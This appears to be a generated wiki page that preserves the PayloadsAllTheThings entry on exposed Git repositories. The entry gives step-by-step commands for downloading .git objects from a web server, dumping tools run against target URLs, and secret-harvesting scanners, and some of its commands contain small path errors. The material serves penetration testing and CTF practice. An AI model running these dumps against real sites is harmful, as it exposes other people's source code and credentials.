---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Git

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-source-code-management-git` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Source Code Management/Git.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Git](../../topics/insecure-source-code-management/git.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-source-code-management-git |
| name | Git |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Source%20Code%20Management/Git.md |

## Preserved Source Material

````yaml
_body: "# Git\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)\n\
  \    * [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex)\n* [Tools](#tools)\n    * [Automatic\
  \ recovery](#automatic-recovery)\n        * [git-dumper.py](#git-dumperpy)\n        * [diggit.py](#diggitpy)\n        *\
  \ [GoGitDumper](#gogitdumper)\n        * [rip-git](#rip-git)\n        * [GitHack](#githack)\n        * [GitTools](#gittools)\n\
  \    * [Harvesting secrets](#harvesting-secrets)\n        * [noseyparker](#noseyparker)\n        * [trufflehog](#trufflehog)\n\
  \        * [Yar](#yar)\n        * [Gitrob](#gitrob)\n        * [Gitleaks](#gitleaks)\n* [References](#references)\n\n##\
  \ Methodology\n\nThe following examples will create either a copy of the .git or a copy of the current commit.\n\nCheck\
  \ for the following files, if they exist you can extract the .git folder.\n\n* `.git/config`\n* `.git/HEAD`\n* `.git/logs/HEAD`\n\
  \n### Recovering file contents from .git/logs/HEAD\n\n* Check for 403 Forbidden or directory listing to find the `/.git/`\
  \ directory\n* Git saves all information in `.git/logs/HEAD` (try lowercase `head` too)\n\n  ```powershell\n  0000000000000000000000000000000000000000\
  \ 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git\n\
  \  15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329\
  \ +0000        commit: Initial.\n  26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael\
  \ <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.\n  6b4131bb3b84e9446218359414d636bda782d097\
  \ a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory\
  \ listing.\n  ```\n\n* Access the commit using the hash\n\n  ```powershell\n  # create an empty .git repository\n  git init\
  \ test\n  cd test/.git\n\n  # download the file\n  wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c\n\
  \n  # first byte for subdirectory, remaining bytes for filename\n  mkdir .git/object/26\n  mv e35470d38c4d6815bc4426a862d5399f04865c\
  \ .git/objects/26/\n\n  # display the file\n  git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c\n      tree 323240a3983045cdc0dec2e88c1358e7998f2e39\n\
  \      parent 15ca375e54f056a576905b41a417b413c57df6eb\n      author Michael <michael@easyctf.com> 1489390329 +0000\n  \
  \    committer Michael <michael@easyctf.com> 1489390329 +0000\n      Initial.\n  ```\n\n* Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39\n\
  \n    ```powershell\n    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39\n    mkdir .git/object/32\n\
  \    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/\n\n    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39\n\
  \        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css\n        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f\
  \        flag.txt\n        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts\n        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1\
  \        index.html\n        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js\n    ```\n\n* Read the data\
  \ (flag.txt)\n\n  ```powershell\n  wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f\n  mkdir\
  \ .git/object/cb\n  mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/\n  git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f\n\
  \  ```\n\n### Recovering file contents from .git/index\n\nUse the git index file parser <https://pypi.python.org/pypi/gin>\
  \ (python3).\n\n```powershell\npip3 install gin\ngin ~/git-repo/.git/index\n```\n\nRecover name and sha1 hash of every file\
  \ listed in the index, and use the same process above to recover the file.\n\n```powershell\n$ gin .git/index | egrep -e\
  \ \"name|sha1\"\nname = AWS Amazon Bucket S3/README.md\nsha1 = 862a3e58d138d6809405aa062249487bee074b98\n\nname = CRLF injection/README.md\n\
  sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141\n```\n\n## Tools\n\n### Automatic recovery\n\n#### git-dumper.py\n\n* [arthaud/git-dumper](https://github.com/arthaud/git-dumper)\n\
  \n```powershell\npip install -r requirements.txt\n./git-dumper.py http://web.site/.git ~/website\n```\n\n#### diggit.py\n\
  \n* [bl4de/security-tools/diggit](https://github.com/bl4de/security-tools/)\n\n```powershell\n./diggit.py -u remote_git_repo\
  \ -t temp_folder -o object_hash [-r=True]\n./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1\n\
  ```\n\n`-u` is remote path, where .git folder exists  \n`-t` is path to local folder with dummy Git repository and where\
  \ blob content (files) are saved with their real names (`cd /path/to/temp/folder && git init`)  \n`-o` is a hash of particular\
  \ Git object to download\n\n#### GoGitDumper\n\n* [c-sto/gogitdumper](https://github.com/c-sto/gogitdumper)\n\n```powershell\n\
  go get github.com/c-sto/gogitdumper\ngogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/\ngit log\ngit checkout\n\
  ```\n\n#### rip-git\n\n* [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)\n\n```powershell\nperl rip-git.pl -v -u\
  \ \"http://web.site/.git/\"\n\ngit cat-file -p 07603070376d63d911f608120eb4b5489b507692\ntree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2\n\
  parent 15ca375e54f056a576905b41a417b413c57df6eb\nauthor Michael <michael@easyctf.com> 1489389105 +0000\ncommitter Michael\
  \ <michael@easyctf.com> 1489389105 +0000\n\ngit cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2\n```\n\n#### GitHack\n\
  \n* [lijiejie/GitHack](https://github.com/lijiejie/GitHack)\n\n```powershell\nGitHack.py http://web.site/.git/\n```\n\n\
  #### GitTools\n\n* [internetwache/GitTools](https://github.com/internetwache/GitTools)\n\n```powershell\n./gitdumper.sh\
  \ http://target.tld/.git/ /tmp/destdir\ngit checkout -- .\n```\n\n### Harvesting secrets\n\n#### noseyparker\n\n> [praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker)\
  \ - Nosey Parker is a command-line tool that finds secrets and sensitive information in textual data and Git history.\n\n\
  ```ps1\ngit clone https://github.com/trufflesecurity/test_keys\ndocker run -v \"$PWD\":/scan ghcr.io/praetorian-inc/noseyparker:latest\
  \ scan --datastore datastore.np ./test_keys/\ndocker run -v \"$PWD\":/scan ghcr.io/praetorian-inc/noseyparker:latest report\
  \ --color always\nnoseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker\n\
  noseyparker scan --datastore np.noseyparker --github-user octocat\n```\n\n#### trufflehog\n\n> Searches through git repositories\
  \ for high entropy strings and secrets, digging deep into commit history.\n\n```powershell\npip install truffleHog\ntruffleHog\
  \ --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git\n```\n\n#### Yar\n\n> Searches through users/organizations\
  \ git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog.\n\n```powershell\n\
  go get github.com/nielsing/yar # https://github.com/nielsing/yar\nyar -o orgname --both\n```\n\n#### Gitrob\n\n> Gitrob\
  \ is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories\
  \ belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files\
  \ that match signatures for potentially sensitive files.\n\n```powershell\ngo get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob\n\
  export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\ngitrob [options] target [target2] ... [targetN]\n```\n\
  \n#### Gitleaks\n\n> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source\
  \ code repositories.\n\n* Run gitleaks against a public repository\n\n    ```powershell\n    docker run --rm --name=gitleaks\
  \ zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git\n    ```\n\n* Run gitleaks against a local repository\
  \ already cloned into /tmp/\n\n    ```powershell\n    docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks\
  \ -v --repo-path=/code/gitleaks\n    ```\n\n* Run gitleaks against a specific Github Pull request\n\n    ```powershell\n\
  \    docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000\n\
  \    ```\n\n## References\n\n* [Gitrob: Now in Go - Michael Henriksen - January 24, 2024](https://web.archive.org/web/20240930092732/https://michenriksen.com/blog/gitrob-now-in-go/)"
_relative_path: Insecure Source Code Management/Git.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Source Code Management/Git.md
````
